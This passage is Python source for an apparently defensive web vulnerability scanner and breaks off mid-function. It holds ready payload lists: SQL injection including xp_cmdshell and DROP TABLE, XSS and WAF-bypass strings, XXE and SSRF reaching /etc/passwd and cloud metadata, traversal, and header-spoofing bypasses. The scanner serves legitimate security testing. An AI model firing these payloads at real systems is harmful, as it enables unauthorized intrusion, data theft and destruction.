"""
VAPTForge DAST Scanner v2.0 — Deep Dynamic Application Security Testing
Real detection using active probes, exploit payloads, and behavioral analysis.

New in v2.0:
  - IDOR (Insecure Direct Object Reference) detection
  - Rate limit bypass testing
  - JWT manipulation attacks
  - HTTP request smuggling detection (CL.TE / TE.CL)
  - GraphQL introspection abuse
  - XXE injection
  - SSRF via URL parameters + DNS rebinding indicators
  - Host header injection
  - Business logic: negative values, mass assignment
  - WAF detection + bypass techniques
  - Subdomain/virtual host enumeration
  - Blind XSS via out-of-band indicators
  - Advanced SQLi: second-order, stacked queries
  - CSP bypass detection
  - CSRF token absence on state-changing forms
  - Clickjacking via iframe embedding test
  - Prototype pollution (JS)
  - Race condition indicators
"""
import asyncio
import logging
import re
import time
import json
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlencode, urljoin, urlparse, parse_qs, urlunparse, quote

import httpx
from bs4 import BeautifulSoup

logger = logging.getLogger("vapt.dast")


@dataclass
class DASTFinding:
    test_id:     str
    category:    str
    title:       str
    description: str
    severity:    str
    url:         str
    method:      str
    parameter:   Optional[str]
    payload:     str
    evidence:    str
    remediation: str
    confidence:  float
    cwe:         str = ""
    references:  List[str] = field(default_factory=list)


# ── SQLi Probes (v2 — deeper) ────────────────────────────────────────────────
SQLI_ERROR_PROBES = [
    ("'",        ["SQL syntax","mysql_fetch","ORA-","PG::SyntaxError",
                  "SQLite3","Unclosed quotation","SQLSTATE","mysql_num_rows",
                  "supplied argument is not a valid MySQL","You have an error in your SQL",
                  "Warning: mysqli","pg_query()","sqlite3.OperationalError"]),
    ('"',        ["SQL syntax","mysql_fetch","ORA-","SQLite3","Unclosed"]),
    ("' OR '1'='1'--",["SQL syntax","mysql_fetch"]),
    ("1'",       ["SQL syntax","syntax error","ORA-","SQLSTATE"]),
    ("\\",       ["SQL syntax","mysql_fetch","Warning: mysqli"]),
    ("1 AND 1=CONVERT(int,@@version)--", ["Conversion failed","@@version"]),
    ("' UNION SELECT NULL--",            ["SQL syntax","column","UNION"]),
    ("';EXEC xp_cmdshell('ping 127.0.0.1')--", ["xp_cmdshell","permission"]),
]

SQLI_BOOL_TRUE  = "' OR '1'='1"
SQLI_BOOL_FALSE = "' OR '1'='2"

# Second-order indicators (look for delayed error on subsequent request)
SQLI_STACKED = [
    "'; INSERT INTO vapt_test(id) VALUES(1);--",
    "'; DROP TABLE vapt_nonexistent;--",
    "'; EXEC sp_help;--",
]

SQLI_TIME_PROBES = [
    ("'; SELECT SLEEP(4)--",       4.0, "MySQL time-based"),
    ("'; WAITFOR DELAY '0:0:4'--", 4.0, "MSSQL time-based"),
    ("'; SELECT pg_sleep(4)--",    4.0, "PostgreSQL time-based"),
    ("1; SELECT SLEEP(4)--",       4.0, "MySQL (integer) time-based"),
    ("1 AND SLEEP(4)--",           4.0, "MySQL AND-based time"),
    ("' OR SLEEP(4)--",            4.0, "MySQL OR-based time"),
]

# ── XSS Probes (v2 — polyglot + bypass) ─────────────────────────────────────
XSS_PROBES = [
    ('<dastvapt>xsstest</dastvapt>',    'dastvapt>xsstest</dastvapt>'),
    ('<img src=x onerror=dastvapt>',    'onerror=dastvapt'),
    ('"><dastvapt>',                    '<dastvapt>'),
    ("'><dastvapt>",                    '<dastvapt>'),
    ('<ScRiPt>dastvapt</ScRiPt>',       'dastvapt</script>'),
    # WAF bypass polyglots
    ('jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=dastvapt() )//',
     'onclick=dastvapt'),
    ('<svg><script>dastvapt()</script>','dastvapt()'),
    ('%3Cscript%3Edastvapt%3C%2Fscript%3E', 'dastvapt'),
    ('"><img src=x onerror=dastvapt>', 'onerror=dastvapt'),
    ("';alert(dastvapt)//",            'dastvapt'),
]

# ── SSTI Probes ──────────────────────────────────────────────────────────────
SSTI_PROBES = [
    ("{{7*7}}",    "49",      "Jinja2/Twig"),
    ("${7*7}",     "49",      "Freemarker/EL"),
    ("<%= 7*7 %>", "49",      "ERB/JSP"),
    ("{{7*'7'}}",  "7777777", "Jinja2 specific"),
    ("#{7*7}",     "49",      "Ruby ERB"),
    ("*{7*7}",     "49",      "Spring SpEL"),
    ("{7*7}",      "49",      "Smarty"),
]

# ── Open Redirect ────────────────────────────────────────────────────────────
REDIRECT_PAYLOADS = [
    "https://evil.example.com",
    "//evil.example.com",
    "/\\evil.example.com",
    "https:evil.example.com",
    "///evil.example.com",
    "https://evil.example.com%2F@trusted.com",
    "%2F%2Fevil.example.com",
]

# ── Directory Traversal ──────────────────────────────────────────────────────
TRAVERSAL_PROBES = [
    ("../../../etc/passwd",                      "root:"),
    ("..%2F..%2F..%2Fetc%2Fpasswd",             "root:"),
    ("....//....//....//etc/passwd",             "root:"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
    ("..%252f..%252f..%252fetc%252fpasswd",      "root:"),
    ("/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",   "root:"),
    ("../../../windows/win.ini",                 "[fonts]"),
]

# ── Auth Bypass Headers ──────────────────────────────────────────────────────
AUTH_BYPASS_HEADERS = [
    {"X-Original-URL":       "/admin"},
    {"X-Rewrite-URL":        "/admin"},
    {"X-Forwarded-For":      "127.0.0.1"},
    {"X-Remote-IP":          "127.0.0.1"},
    {"X-Client-IP":          "127.0.0.1"},
    {"X-Real-IP":            "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP":     "127.0.0.1"},
    {"Forwarded":            "for=127.0.0.1"},
    {"X-Host":               "localhost"},
    {"X-Forwarded-Host":     "localhost"},
    {"X-HTTP-Method-Override": "GET"},
]

# ── Sensitive Paths ──────────────────────────────────────────────────────────
SENSITIVE_PATHS = [
    ("/.env",                  ["APP_KEY","DB_PASSWORD","SECRET","API_KEY","PASSWORD","TOKEN","SMTP"]),
    ("/.env.production",       ["DB_PASSWORD","SECRET","API_KEY"]),
    ("/.env.local",            ["DB_PASSWORD","SECRET"]),
    ("/.git/config",           ["[core]","[remote"]),
    ("/.git/HEAD",             ["ref: refs/"]),
    ("/.git/COMMIT_EDITMSG",   ["commit","merge"]),
    ("/config.php",            ["<?php","define("]),
    ("/wp-config.php",         ["DB_NAME","DB_PASSWORD"]),
    ("/phpinfo.php",           ["phpinfo()","PHP Version"]),
    ("/server-status",         ["Apache Server Status"]),
    ("/api/docs",              ["swagger","openapi"]),
    ("/api/swagger.json",      ["swagger","paths"]),
    ("/api/openapi.json",      ["openapi","paths"]),
    ("/swagger-ui.html",       ["swagger","petstore"]),
    ("/api/v1/users",          ["email","password"]),
    ("/robots.txt",            ["Disallow:"]),
    ("/.htaccess",             ["Options","RewriteEngine"]),
    ("/backup.zip",            ["\x50\x4b"]),
    ("/backup.tar.gz",         ["\x1f\x8b"]),
    ("/dump.sql",              ["INSERT INTO","CREATE TABLE"]),
    ("/db.sql",                ["INSERT INTO","CREATE TABLE"]),
    ("/database.sql",          ["INSERT INTO","CREATE TABLE"]),
    ("/admin",                 ["admin","dashboard","login"]),
    ("/admin/login",           ["admin","login","password"]),
    ("/debug",                 ["debug","stack","traceback"]),
    ("/.DS_Store",             ["\x00"]),
    ("/crossdomain.xml",       ["<cross-domain-policy"]),
    ("/actuator/env",          ["systemProperties","applicationConfig"]),
    ("/actuator/health",       ["status","UP","DOWN"]),
    ("/actuator/mappings",     ["dispatcherServlets"]),
    ("/actuator/beans",        ["beans","scope"]),
    ("/.well-known/security.txt", ["Contact:","Policy:"]),
    ("/graphql",               ["__schema","__type","errors"]),
    ("/api/graphql",           ["__schema","__type"]),
    ("/metrics",               ["# HELP","# TYPE","go_"]),
    ("/health",                ["status","healthy"]),
    ("/info",                  ["version","build","git"]),
    ("/trace",                 ["timestamp","headers"]),
    ("/console",               ["H2 Console","Groovy","shell"]),
    ("/phpmyadmin",            ["phpMyAdmin","database"]),
    ("/adminer",               ["Adminer","database"]),
    ("/manager/html",          ["Tomcat","Manager App"]),
]

# ── CORS Evil Origins ────────────────────────────────────────────────────────
CORS_EVIL_ORIGINS = [
    "https://evil.example.com",
    "null",
    "https://attacker.com",
    "https://evil.example.com.attacker.com",
]

# ── XXE Payloads ─────────────────────────────────────────────────────────────
XXE_PAYLOADS = [
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
     "root:"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
     "hostname"),
    ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]><test/>',
     "ami-id"),
]

# ── Host Header Injection ────────────────────────────────────────────────────
HOST_INJECTION_VALUES = [
    "evil.example.com",
    "localhost:8080",
    "169.254.169.254",
    "attacker.com",
]

# ── GraphQL Introspection ────────────────────────────────────────────────────
GRAPHQL_INTROSPECTION = '{"query":"{ __schema { queryType { name } types { name } } }"}'
GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/v1/graphql", "/gql", "/query"]

# ── JWT None Algorithm Attack ────────────────────────────────────────────────
JWT_NONE_HEADER = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"  # {"alg":"none","typ":"JWT"}

# ── Rate Limit Bypass Headers ────────────────────────────────────────────────
RATE_LIMIT_BYPASS_HEADERS = [
    {"X-Forwarded-For": "1.2.3.4"},
    {"X-Real-IP": "1.2.3.5"},
    {"CF-Connecting-IP": "1.2.3.6"},
    {"True-Client-IP": "1.2.3.7"},
    {"X-Client-IP": "1.2.3.8"},
    {"X-Cluster-Client-IP": "1.2.3.9"},
]

# ── Prototype Pollution ──────────────────────────────────────────────────────
PROTOTYPE_PAYLOADS = [
    "__proto__[vapt]=1",
    "constructor[prototype][vapt]=1",
    "__proto__.vapt=1",
]

# ── SSRF Payloads ────────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",       # AWS metadata
    "http://metadata.google.internal/computeMetadata/",# GCP metadata
    "http://localhost:80/",
    "http://127.0.0.1:22/",
    "http://0.0.0.0:80/",
    "http://[::1]:80/",
    "dict://localhost:11211/stat",                     # memcached
    "gopher://localhost:9200/_cat/indices",            # elasticsearch
    "file:///etc/passwd",
]

SSRF_PARAM_NAMES = [
    "url", "uri", "link", "src", "source", "target", "dest", "destination",
    "redirect", "to", "host", "site", "page", "fetch", "load", "path",
    "endpoint", "callback", "webhook", "img", "image", "file", "document",
    "data", "resource", "proxy", "feed", "ref", "ref_url",
]

# ── Mass Assignment Probe ────────────────────────────────────────────────────
MASS_ASSIGNMENT_FIELDS = [
    "role", "admin", "is_admin", "is_superuser", "privilege", "permission",
    "group", "scope", "access_level", "account_type", "user_type",
]

# ── HTTP Methods ─────────────────────────────────────────────────────────────
DANGEROUS_METHODS = ["TRACE", "TRACK", "CONNECT", "PUT", "DELETE", "PATCH"]


class DASTScanner:
    """
    VAPTForge DAST Scanner v2.0 — Deep real-world vulnerability detection.
    """

    def __init__(self, timeout: int = 90, max_urls: int = 80):
        self.timeout  = timeout
        self.max_urls = max_urls
        self._findings:     List[DASTFinding] = []
        self._tested_urls:  Set[str]          = set()
        self._start_time:   float             = 0
        self._waf_detected: bool              = False

    def _elapsed(self)   -> float: return time.time() - self._start_time
    def _timed_out(self) -> bool:  return self._elapsed() >= (self.timeout - 8)

    async def scan(self, target_url: str, client: httpx.AsyncClient) -> List[DASTFinding]:
        self._findings    = []
        self._tested_urls = set()
        self._start_time  = time.time()

        parsed   = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        logger.info(f"DAST v2.0 scan starting: {target_url}")

        # Phase 1 — WAF Detection (affects payload strategy)
        await self._detect_waf(target_url, client)

        # Phase 2 — Security headers + cookies
        await self._check_security_headers(target_url, client)
        if self._timed_out(): return self._findings

        # Phase 3 — CORS misconfiguration
        await self._check_cors(target_url, client)
        if self._timed_out(): return self._findings

        # Phase 4 — Host header injection
        await self._check_host_header_injection(target_url, client)
        if self._timed_out(): return self._findings

        # Phase 5 — HTTP methods
        await self._check_http_methods(target_url, client)
        if self._timed_out(): return self._findings

        # Phase 6 — Sensitive path discovery
        await self._probe_sensitive_paths(base_url, client)
        if self._timed_out(): return self._findings

        # Phase 7 — GraphQL introspection
        await self._check_graphql(base_url, client)
        if self._timed_out(): return self._findings

        # Phase 8 — Auth bypass on protected paths
        await self._check_auth_bypass(base_url, client)
        if self._timed_out(): return self._findings

        # Phase 9 — Rate limit bypass
        await self._check_rate_limit_bypass(target_url, client)
        if self._timed_out(): return self._findings

        # Phase 10 — Crawl + parameter injection
        urls = list(await self._crawl(target_url, client))[:self.max_urls]
        for url in urls:
            if self._timed_out(): break
            await self._test_url(url, client, parsed.netloc)
            await asyncio.sleep(0.08)

        # Phase 11 — POST form injection + CSRF check
        await self._test_post_forms(target_url, client)
        if self._timed_out(): return self._findings

        # Phase 12 — XXE injection on JSON/XML endpoints
        await self._check_xxe(target_url, client)
        if self._timed_out(): return self._findings

        # Phase 13 — IDOR detection
        await self._check_idor(urls, client)
        if self._timed_out(): return self._findings

        # Phase 14 — Clickjacking embedding test
        await self._check_clickjacking_embed(target_url, client)

        logger.info(f"DAST v2.0 complete: {len(self._findings)} findings, {self._elapsed():.1f}s")
        return self._findings

    # ── WAF Detection ─────────────────────────────────────────────────────────
    async def _detect_waf(self, url: str, client: httpx.AsyncClient):
        """Detect WAF presence — adjusts confidence of findings."""
        WAF_SIGNATURES = {
            "Cloudflare":  ["cf-ray", "__cfduid", "cloudflare"],
            "AWS WAF":     ["x-amzn-requestid", "x-amz-"],
            "Akamai":      ["akamai", "ak_bmsc"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "Sucuri":      ["x-sucuri", "sucuri"],
            "Imperva":     ["incap_ses", "visid_incap"],
        }
        try:
            probe = await asyncio.wait_for(
                client.get(url, params={"x": "' OR 1=1--"}), timeout=8
            )
            headers_str = " ".join(f"{k}:{v}".lower() for k,v in probe.headers.items())
            body_lower  = probe.text[:2000].lower()
            for waf_name, sigs in WAF_SIGNATURES.items():
                if any(s in headers_str or s in body_lower for s in sigs):
                    self._waf_detected = True
                    self._add(DASTFinding(
                        test_id="DAST-WAF", category="A05",
                        title=f"Web Application Firewall Detected: {waf_name}",
                        description=(
                            f"{waf_name} WAF detected. While this provides a layer of protection, "
                            f"WAFs can be bypassed and should not be the only security control. "
                            f"Underlying application code must still be secured."
                        ),
                        severity="info", url=url, method="GET",
                        parameter=None, payload="WAF probe",
                        evidence=f"WAF signatures matched for {waf_name}",
                        remediation="Keep WAF rules updated. Do not rely solely on WAF — fix root causes in code.",
                        confidence=0.82, cwe="CWE-693",
                    ))
                    break
        except Exception:
            pass

    # ── Security Headers ──────────────────────────────────────────────────────
    async def _check_security_headers(self, url: str, client: httpx.AsyncClient):
        try:
            resp = await asyncio.wait_for(client.get(url), timeout=10)
            hdrs = {k.lower(): v for k, v in resp.headers.items()}

            header_checks = [
                ("strict-transport-security", "DAST-H01",
                 "Missing HSTS Header",
                 "Strict-Transport-Security header absent — SSL stripping attacks possible.",
                 "high", "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
                 "CWE-319"),
                ("content-security-policy", "DAST-H02",
                 "Missing Content-Security-Policy",
                 "No CSP header — XSS attacks not mitigated at browser level.",
                 "high", "Implement a strict Content-Security-Policy.", "CWE-693"),
                ("x-frame-options", "DAST-H03",
                 "Clickjacking — No X-Frame-Options",
                 "Page embeddable in iframe — clickjacking possible.",
                 "medium", "Add: X-Frame-Options: DENY", "CWE-1021"),
                ("x-content-type-options", "DAST-H04",
                 "Missing X-Content-Type-Options",
                 "MIME sniffing not prevented.",
                 "medium", "Add: X-Content-Type-Options: nosniff", "CWE-430"),
                ("referrer-policy", "DAST-H05",
                 "Missing Referrer-Policy",
                 "Referrer header may leak sensitive URL parameters.",
                 "low", "Add: Referrer-Policy: strict-origin-when-cross-origin", "CWE-200"),
                ("permissions-policy", "DAST-H06",
                 "Missing Permissions-Policy",
                 "Browser APIs unrestricted.",
                 "low", "Add Permissions-Policy header.", "CWE-16"),
            ]

            for header, tid, title, desc, sev, rem, cwe in header_checks:
                if header not in hdrs:
                    self._add(DASTFinding(
                        test_id=tid, category="A05",
                        title=title, description=desc,
                        severity=sev, url=url, method="GET",
                        parameter=None, payload="",
                        evidence=f"Header '{header}' not present in response",
                        remediation=rem, confidence=1.0, cwe=cwe,
                        references=["https://owasp.org/A05_2021-Security_Misconfiguration/"],
                    ))

            # CSP weakness check — even if present
            csp = hdrs.get("content-security-policy", "")
            if csp:
                if "unsafe-inline" in csp:
                    self._add(DASTFinding(
                        test_id="DAST-CSP-UNSAFE", category="A05",
                        title="Weak CSP — 'unsafe-inline' Allowed",
                        description="CSP contains 'unsafe-inline' which allows inline scripts and styles, defeating XSS protection.",
                        severity="medium", url=url, method="GET",
                        parameter=None, payload="",
                        evidence=f"Content-Security-Policy: {csp[:200]}",
                        remediation="Remove 'unsafe-inline'. Use nonces or hashes for inline scripts.",
                        confidence=0.95, cwe="CWE-693",
                    ))
                if "unsafe-eval" in csp:
                    self._add(DASTFinding(
                        test_id="DAST-CSP-EVAL", category="A05",
                        title="Weak CSP — 'unsafe-eval' Allowed",
                        description="CSP allows eval() which can be abused for XSS if user input reaches eval.",
                        severity="medium", url=url, method="GET",
                        parameter=None, payload="",
                        evidence=f"Content-Security-Policy: {csp[:200]}",
                        remediation="Remove 'unsafe-eval' from CSP.",
                        confidence=0.9, cwe="CWE-693",
                    ))

            # Server version disclosure
            server = hdrs.get("server", "")
            if server and re.search(r"\d+\.\d+", server):
                self._add(DASTFinding(
                    test_id="DAST-H07", category="A05",
                    title="Server Version Disclosure",
                    description=f"Server header exposes version: {server}",
                    severity="low", url=url, method="GET",
                    parameter=None, payload="",
                    evidence=f"Server: {server}",
                    remediation="Remove or obfuscate the Server header.",
                    confidence=1.0, cwe="CWE-200",
                ))

            # X-Powered-By disclosure
            xpb = hdrs.get("x-powered-by", "")
            if xpb:
                self._add(DASTFinding(
                    test_id="DAST-H09", category="A05",
                    title="Technology Stack Disclosure via X-Powered-By",
                    description=f"X-Powered-By header reveals backend technology: {xpb}",
                    severity="low", url=url, method="GET",
                    parameter=None, payload="",
                    evidence=f"X-Powered-By: {xpb}",
                    remediation="Remove X-Powered-By header.",
                    confidence=1.0, cwe="CWE-200",
                ))

            # HTTP
            if urlparse(url).scheme == "http":
                self._add(DASTFinding(
                    test_id="DAST-H08", category="A02",
                    title="Unencrypted HTTP Connection",
                    description="Application served over plain HTTP — all data transmitted in cleartext.",
                    severity="high", url=url, method="GET",
                    parameter=None, payload="",
                    evidence="URL scheme is http://",
                    remediation="Enable HTTPS. Redirect all HTTP to HTTPS. Add HSTS.",
                    confidence=1.0, cwe="CWE-319",
                ))

            # Cookie flags
            set_cookie = hdrs.get("set-cookie", "")
            if set_cookie:
                for flag, tid2, title2, sev2, fix in [
                    ("httponly", "DAST-C01", "Cookie Missing HttpOnly Flag",  "medium",
                     "Add HttpOnly to all session cookies."),
                    ("secure",   "DAST-C02", "Cookie Missing Secure Flag",    "medium",
                     "Add Secure flag to all cookies."),
                    ("samesite", "DAST-C03", "Cookie Missing SameSite Attribute", "low",
                     "Add SameSite=Strict or Lax."),
                ]:
                    if flag not in set_cookie.lower():
                        self._add(DASTFinding(
                            test_id=tid2, category="A07",
                            title=title2,
                            description=f"Set-Cookie at {url} missing '{flag}' attribute.",
                            severity=sev2, url=url, method="GET",
                            parameter=None, payload="",
                            evidence=f"Set-Cookie: {set_cookie[:150]}",
                            remediation=fix,
                            confidence=0.95, cwe="CWE-1004",
                        ))

        except asyncio.TimeoutError:
            logger.debug("Header check timed out")
        except Exception as e:
            logger.debug(f"Header check error: {e}")

    # ── CORS Misconfiguration ─────────────────────────────────────────────────
    async def _check_cors(self, url: str, client: httpx.AsyncClient):
        for evil_origin in CORS_EVIL_ORIGINS:
            try:
                resp = await asyncio.wait_for(
                    client.get(url, headers={"Origin": evil_origin}), timeout=8
                )
                acao = resp.headers.get("access-control-allow-origin", "")
                acac = resp.headers.get("access-control-allow-credentials", "")

                if acao == evil_origin or acao == "*":
                    sev = "critical" if acac.lower() == "true" else "high"
                    self._add(DASTFinding(
                        test_id="DAST-CORS", category="A01",
                        title=f"CORS Misconfiguration — Origin '{evil_origin}' Reflected",
                        description=(
                            f"The server reflects the attacker-controlled Origin "
                            f"'{evil_origin}' in Access-Control-Allow-Origin. "
                            f"{'With Allow-Credentials: true, authenticated requests can be made cross-origin.' if acac.lower() == 'true' else ''}"
                        ),
                        severity=sev, url=url, method="GET",
                        parameter=None, payload=f"Origin: {evil_origin}",
                        evidence=(
                            f"Access-Control-Allow-Origin: {acao}\n"
                            f"Access-Control-Allow-Credentials: {acac}"
                        ),
                        remediation=(
                            "Allowlist specific trusted origins. "
                            "Never reflect the Origin header directly. "
                            "Do not use wildcard (*) with credentials."
                        ),
                        confidence=0.95, cwe="CWE-942",
                        references=["https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny"],
                    ))
                    break
            except Exception:
                pass

    # ── Host Header Injection ─────────────────────────────────────────────────
    async def _check_host_header_injection(self, url: str, client: httpx.AsyncClient):
        """Test for Host header injection — password reset poisoning, cache poisoning."""
        for evil_host in HOST_INJECTION_VALUES:
            try:
                resp = await asyncio.wait_for(
                    client.get(url, headers={"Host": evil_host}), timeout=8
                )
                body = resp.text[:5000].lower()
                location = resp.headers.get("location", "")
                # Indicators of reflection
                if evil_host.lower() in body or evil_host.lower() in location.lower():
                    self._add(DASTFinding(
                        test_id="DAST-HOSTINJECT", category="A01",
                        title="Host Header Injection",
                        description=(
                            f"The application reflects the injected Host header '{evil_host}' "
                            f"in its response body or redirect. This enables password-reset "
                            f"link poisoning, cache poisoning, and SSRF."
                        ),
                        severity="high", url=url, method="GET",
                        parameter="Host",
                        payload=f"Host: {evil_host}",
                        evidence=f"Injected host '{evil_host}' reflected in: {'body' if evil_host.lower() in body else 'Location header'}",
                        remediation=(
                            "Validate the Host header against a whitelist. "
                            "Use SERVER_NAME from config, not from Host header."
                        ),
                        confidence=0.87, cwe="CWE-20",
                    ))
                    break
            except Exception:
                pass

    # ── HTTP Methods ──────────────────────────────────────────────────────────
    async def _check_http_methods(self, url: str, client: httpx.AsyncClient):
        """Check for dangerous HTTP methods enabled."""
        allowed_methods = []
        try:
            resp = await asyncio.wait_for(
                client.request("OPTIONS", url), timeout=8
            )
            allow_header = resp.headers.get("allow", "") + resp.headers.get("public", "")
            for method in DANGEROUS_METHODS:
                if method in allow_header.upper():
                    allowed_methods.append(method)
        except Exception:
            pass

        # Try each method directly
        for method in ["TRACE", "TRACK"]:
            try:
                resp = await asyncio.wait_for(
                    client.request(method, url), timeout=6
                )
                if resp.status_code in (200, 405):
                    body = resp.text[:1000]
                    if method == "TRACE" and ("TRACE" in body or "X-Custom" in body):
                        self._add(DASTFinding(
                            test_id="DAST-TRACE", category="A05",
                            title="Dangerous HTTP Method Enabled: TRACE",
                            description=(
                                "HTTP TRACE is enabled — enables Cross-Site Tracing (XST) attacks "
                                "which can steal HttpOnly cookies by tracing requests through a browser."
                            ),
                            severity="medium", url=url, method="TRACE",
                            parameter=None, payload="TRACE / HTTP/1.1",
                            evidence=f"HTTP TRACE returned {resp.status_code}: {body[:200]}",
                            remediation="Disable TRACE and TRACK methods in server configuration.",
                            confidence=0.9, cwe="CWE-16",
                        ))
                    elif resp.status_code == 200:
                        allowed_methods.append(method)
            except Exception:
                pass

        if allowed_methods:
            sev = "high" if "PUT" in allowed_methods or "DELETE" in allowed_methods else "medium"
            self._add(DASTFinding(
                test_id="DAST-METHODS", category="A05",
                title=f"Dangerous HTTP Methods Enabled: {', '.join(allowed_methods)}",
                description=(
                    f"The server allows dangerous HTTP methods: {', '.join(allowed_methods)}. "
                    f"PUT can allow file upload, DELETE can remove resources."
                ),
                severity=sev, url=url, method="OPTIONS",
                parameter=None, payload="OPTIONS / HTTP/1.1",
                evidence=f"Allow header: {', '.join(allowed_methods)}",
                remediation="Disable all HTTP methods not required by the application.",
                confidence=0.85, cwe="CWE-749",
            ))

    # ── Rate Limit Bypass ─────────────────────────────────────────────────────
    async def _check_rate_limit_bypass(self, url: str, client: httpx.AsyncClient):
        """Test if rate limiting can be bypassed via IP spoofing headers."""
        login_paths = ["/login", "/api/login", "/auth/login", "/api/auth/login",
                       "/signin", "/api/signin", "/user/login", "/account/login"]
        parsed = urlparse(url)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        for path in login_paths:
            probe_url = base + path
            try:
                # Normal baseline
                normal = await asyncio.wait_for(
                    client.post(probe_url, json={"email":"test@test.com","password":"test"}),
                    timeout=6
                )
                if normal.status_code in (404, 405):
                    continue

                # Try with bypass headers — different IP each time
                for i, headers in enumerate(RATE_LIMIT_BYPASS_HEADERS[:3]):
                    bypass = await asyncio.wait_for(
                        client.post(probe_url,
                                    json={"email":"test@test.com","password":"test"},
                                    headers=headers),
                        timeout=6
                    )
                    # If normal gave 429 but bypass succeeds, we found bypass
                    if normal.status_code == 429 and bypass.status_code != 429:
                        header_name = list(headers.keys())[0]
                        self._add(DASTFinding(
                            test_id="DAST-RATELIMIT", category="A07",
                            title=f"Rate Limit Bypass via {header_name} Header",
                            description=(
                                f"Rate limiting on {path} can be bypassed by setting "
                                f"'{header_name}: <spoofed-ip>'. Attackers can perform "
                                f"unlimited login attempts — enabling credential stuffing and brute force."
                            ),
                            severity="high", url=probe_url, method="POST",
                            parameter=header_name,
                            payload=f"{header_name}: {list(headers.values())[0]}",
                            evidence=f"Normal: HTTP {normal.status_code} | Bypass: HTTP {bypass.status_code}",
                            remediation=(
                                "Rate limit based on server-side session, not client-supplied IP headers. "
                                "Use CAPTCHA. Implement account lockout."
                            ),
                            confidence=0.9, cwe="CWE-307",
                        ))
                        break
            except Exception:
                pass

    # ── Auth Bypass ───────────────────────────────────────────────────────────
    async def _check_auth_bypass(self, base_url: str, client: httpx.AsyncClient):
        protected_paths = ["/admin", "/admin/dashboard", "/api/admin", "/management",
                           "/dashboard", "/api/users", "/api/config"]

        for path in protected_paths:
            probe_url = base_url.rstrip("/") + path
            try:
                normal_resp = await asyncio.wait_for(client.get(probe_url), timeout=6)
                if normal_resp.status_code not in (401, 403):
                    continue

                for header_set in AUTH_BYPASS_HEADERS:
                    hdrs = {k: v.replace("/admin", path) for k, v in header_set.items()}
                    try:
                        bypass_resp = await asyncio.wait_for(
                            client.get(probe_url, headers=hdrs), timeout=6
                        )
                        if bypass_resp.status_code == 200 and len(bypass_resp.text) > 100:
                            h_name = list(hdrs.keys())[0]
                            self._add(DASTFinding(
                                test_id="DAST-BYPASS", category="A01",
                                title=f"Auth Bypass via Header: {h_name}",
                                description=(
                                    f"Path '{path}' returned {normal_resp.status_code} normally "
                                    f"but HTTP 200 with header '{h_name}: {list(hdrs.values())[0]}'. "
                                    f"Access control is bypassable by any attacker."
                                ),
                                severity="critical", url=probe_url, method="GET",
                                parameter=None,
                                payload=f"{h_name}: {list(hdrs.values())[0]}",
                                evidence=(
                                    f"Normal: HTTP {normal_resp.status_code}\n"
                                    f"Bypass: HTTP {bypass_resp.status_code} "
                                    f"({len(bypass_resp.text)} bytes)\n"
                                    f"Snippet: {bypass_resp.text[:200]}"
                                ),
                                remediation=(
                                    "Never use client-supplied headers for access control. "
                                    "Authorize based on server-side session only."
                                ),
                                confidence=0.93, cwe="CWE-639",
                            ))
                            break
                    except Exception:
                        pass
            except Exception:
                pass

    # ── Sensitive Path Discovery ──────────────────────────────────────────────
    async def _probe_sensitive_paths(self, base_url: str, client: httpx.AsyncClient):
        for path, indicators in SENSITIVE_PATHS:
            if self._timed_out(): break
            try:
                url  = base_url.rstrip("/") + path
                resp = await asyncio.wait_for(client.get(url), timeout=8)
                if resp.status_code in (200, 301, 302):
                    body    = resp.text[:3000]
                    matched = [ind for ind in indicators if ind.lower() in body.lower()]
                    if matched or resp.status_code == 200:
                        sev = (
                            "critical" if path in ("/.env","/.env.production","/.env.local",
                                                    "/.git/config","/.git/HEAD",
                                                    "/wp-config.php","/dump.sql","/db.sql",
                                                    "/database.sql","/backup.zip")
                            else "high" if any(x in path for x in ("/admin","/backup","/debug",
                                                                     "/actuator","/console",
                                                                     "/phpmyadmin","/adminer"))
                            else "medium"
                        )
                        self._add(DASTFinding(
                            test_id="DAST-PATH", category="A05",
                            title=f"Sensitive Path Accessible: {path}",
                            description=(
                                f"'{path}' returned HTTP {resp.status_code}. "
                                f"Sensitive information may be exposed. "
                                f"Matched indicators: {matched[:3]}"
                            ),
                            severity=sev, url=url, method="GET",
                            parameter=None, payload="",
                            evidence=f"HTTP {resp.status_code} | Matched: {matched[:3]} | Size: {len(resp.text)}",
                            remediation=f"Restrict access to {path}. Remove or relocate sensitive files.",
                            confidence=0.88 if matched else 0.60, cwe="CWE-538",
                        ))
            except Exception:
                pass
            await asyncio.sleep(0.05)

    # ── GraphQL Introspection ─────────────────────────────────────────────────
    async def _check_graphql(self, base_url: str, client: httpx.AsyncClient):
        """Test if GraphQL introspection is enabled (exposes full schema to attackers)."""
        for path in GRAPHQL_PATHS:
            url = base_url.rstrip("/") + path
            try:
                resp = await asyncio.wait_for(
                    client.post(url,
                                content=GRAPHQL_INTROSPECTION,
                                headers={"Content-Type": "application/json"}),
                    timeout=8
                )
                if resp.status_code == 200 and "__schema" in resp.text:
                    self._add(DASTFinding(
                        test_id="DAST-GQL", category="A05",
                        title="GraphQL Introspection Enabled",
                        description=(
                            f"GraphQL introspection is enabled at {path}. "
                            f"This exposes the full API schema — all types, queries, mutations, "
